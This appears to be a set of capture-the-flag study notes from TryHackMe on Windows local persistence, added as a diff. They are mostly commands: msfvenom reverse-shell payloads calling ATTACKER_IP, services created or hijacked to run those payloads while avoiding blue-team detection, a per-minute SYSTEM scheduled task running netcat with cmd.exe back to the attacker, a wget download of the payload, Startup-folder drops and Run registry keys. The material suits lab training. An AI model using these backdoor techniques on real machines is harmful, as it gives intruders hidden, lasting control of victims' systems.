@@ -1,0 +1,111 @@
+
+Windows Local Persistence
+(Notes from TryHackme)\\
+We can create and start a service named "THMservice" using the following commands:
+
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+Note: There must be a space after each equal sign for the command to work.
+
+This service doesn't require user action. On the Attack Machine, create a reverse shell with msfvenom.
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp 
+LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+
+You can then copy the executable to your target system, say in C:/Windows and point the service's binPath to it:
+
+sc.exe create THMservice2 binPath= "C:/windows/rev-svc.exe" start= auto
+sc.exe start THMservice2
+
+This should create a connection back to your attacker's machine.
+
+Modifying existing services
+(Notes from TryHackme)\\
+While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.\\ You can get a list of available services using the following command:\\
+
+sc.exe query state=all
+
+Identify a stopped service and query it's configuration:
+
+sc.exe qc THMService3
+
+Creating a new reverse shell with msfvenom:
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP 
+LPORT=5558 -f exe-service -o rev-svc2.exe
+
+To reconfigure "THMservice3" parameters, we can use the following command:
+
+C:/> sc.exe config THMservice3 binPath= "C:/Windows/rev-svc2.exe" 
+start= auto obj= "LocalSystem"
+
+
+
+Abusing Scheduled Tasks
+(Notes from TryHackme)\\
+The most common way to schedule tasks is using the built-in Windows task scheduler. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use \texttt{schtasks} to interact with the task scheduler. A complete reference for the command can be found on Microsoft's website. Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:
+
+C:/> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:/tools/nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+
+The security descriptors of all scheduled tasks are stored in \texttt{HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Schedule/TaskCache/Tree/}. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.
+
+c:/tools/pstools/PsExec64.exe -s -i regedit
+
+Setup a Netcat listener to receive the shell:
+
+user@AttackBox$ nc -lvp 4449
+
+
+Logon Triggered Persistence
+(Notes from TryHackme)\\
+Each user has a folder under 
+
+C:/Users/<your_username>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
+
+where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder. 
+
+Generate a payload with MSFVenom:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+
+
+Host the Payload on a Python Server:
+
+python3 -m http.server
+
+
+Retrieve the hosted file:
+
+wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+
+Copy the payload to the startup folder:
+
+copy revshell.exe "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/"
+
+
+Start a netcat listener and ensure the Windows user signs out and back in again:
+
+nc -lvnp 4450
+
+Retrieve the flag from the command prompt:
+
+C:/flags/flag10.exe
+
+
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
+
+
+python3 -m http.server
+wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+
+
+
+C:/> move revshell.exe C:/Windows
+
+
+Let's then create a \texttt{REG\_EXPAND\_SZ} registry entry under:
+
+HKLM/Software/Microsoft/Windows/CurrentVersion/Run
+
+The entry's name can be anything you like, and the value will be the command we want to execute.
